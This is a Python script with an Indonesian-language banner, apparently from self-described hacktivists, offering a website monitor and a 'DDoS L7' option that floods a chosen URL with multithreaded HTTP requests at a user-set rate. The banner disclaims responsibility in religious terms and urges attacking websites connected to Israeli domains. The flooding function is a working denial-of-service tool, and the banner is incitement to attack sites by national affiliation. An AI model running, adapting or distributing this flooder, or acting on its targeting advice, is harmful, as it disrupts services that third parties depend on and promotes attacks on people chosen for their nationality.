import requests
import time
import sys
import threading
import os
from colorama import Fore, Style, init

# Inisialisasi Colorama
init()

def clear_screen():
    os.system('clear')  # Untuk membersihkan layar di terminal Linux

def check_website(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(Fore.GREEN + f"Website {url} is up and running!" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Website {url} is down with status code: {response.status_code}" + Style.RESET_ALL)
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"An error occurred while trying to access {url}: {e}" + Style.RESET_ALL)

def monitor_website():
    url = input("Enter the website URL: ")
    interval = float(input("Enter the monitoring interval (in seconds): "))
    print(f"Monitoring website {url} every {interval} seconds...")

    while True:
        clear_screen()
        check_website(url)
        time.sleep(interval)

def stress_test(url):
    requests_per_second = int(input("Enter the number of requests per second: "))
    num_threads = int(input("Enter the number of threads: "))

    def send_requests():
        requests_sent = 0
        session = requests.Session()
        try:
            while not stop_event.is_set():
                session.get(url)
                requests_sent += 1
                print(Fore.GREEN + f"Thread-{threading.current_thread().ident}: Request {requests_sent} Berhasil" + Style.RESET_ALL)
                time.sleep(1 / requests_per_second)
        except Exception as e:
            print(Fore.RED + f"Thread-{threading.current_thread().ident} encountered an error: {e}" + Style.RESET_ALL)

    stop_event = threading.Event()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests)
        thread.start()
        threads.append(thread)

    try:
        input("Press Enter to stop the stress test or type 'exit' to exit...\n")
    except KeyboardInterrupt:
        print("Stopping the stress test...")
        stop_event.set()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    clear_screen()

    print(Fore.CYAN + '''
    Disclaimer: TOOLS INI HANYA DIGUNAKAN UNTUK TESTER
                 GUNAKAN DENGAN BIJAK

               BACA INI:
                 "WALLAHI, SAYA AKAN TANGGUNG DOSA SAYA SENDIRI JIKA TOOLS INI DISALAH GUNAKAN,
                 SEMUA DOSA CUKUP SAYA YANG TANGGUNG DAN PENGEMBANG TOOLS TIDAK AKAN MENANGGUNG
                 DOSA JARIYAH KARENA PENYALAHGUNAAN TOOLS INI
                 NAMUN, JIKA TOOLS INI DIGUNAKAN DENGAN BIJAK, MAKA PENGEMBANG JUGA AKAN
                 MENDAPATKAN PAHALA JARIYAH ATAS PENGGUNAAN TOOLS INI"

                 TERIMA KASIH TELAH BERJANJI :)
                 KAMI SARANKAN SERANG WEB YANG BERHUBUNGAN DENGAN DOMAIN ISRAEL.

    TOOLS BY H-0071 TECHNO.HACXTIVIST & B-9881 CYBER.HACKTIVIST
    ''' + Style.RESET_ALL)

    option = input(Fore.CYAN + "Choose an option:\n1. Monitor Website\n2. DDoS L7\n3. Exit\nEnter the option: " + Style.RESET_ALL)

    if option == '1':
        monitor_website()
    elif option == '2':
        url = input(Fore.CYAN + "Enter the website URL: " + Style.RESET_ALL)
        stress_test(url)
    elif option == '3':
        sys.exit(Fore.CYAN + "KELUAR. Thank you bre!" + Style.RESET_ALL)
    else:
        print(Fore.RED + "Invalid option. Exiting..." + Style.RESET_ALL)
